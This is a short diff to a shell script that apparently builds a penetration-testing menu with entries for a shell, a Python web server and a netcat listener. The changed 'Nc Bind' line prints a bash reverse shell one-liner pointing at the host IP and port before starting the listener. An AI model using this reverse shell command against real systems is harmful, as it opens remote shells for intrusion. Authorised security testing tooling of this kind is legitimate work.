@@ -45,7 +45,7 @@ done <<< "$LIST_INTERFACES"
 echo "Host"
 echo "--Shell | bash='export EZTARGET=\"$TARGET\"; export EZHOST=\"$HOST_IP\"; source $LIB_FOLDER/shell.sh'"
 echo "--Web | bash='cd $HOST_WEBROOT && python3 -m http.server $HOST_WEBPORT'"
-echo "--Nc Bind | bash='nc -lvp $HOST_NCPORT'"
+echo "--Nc Bind | bash='echo \"REVERSE SHELL CMD: bash -i >& /dev/tcp/$HOST_IP/$HOST_NCPORT 0>&1\"; nc -lvp $HOST_NCPORT'"
 
 
 # Config
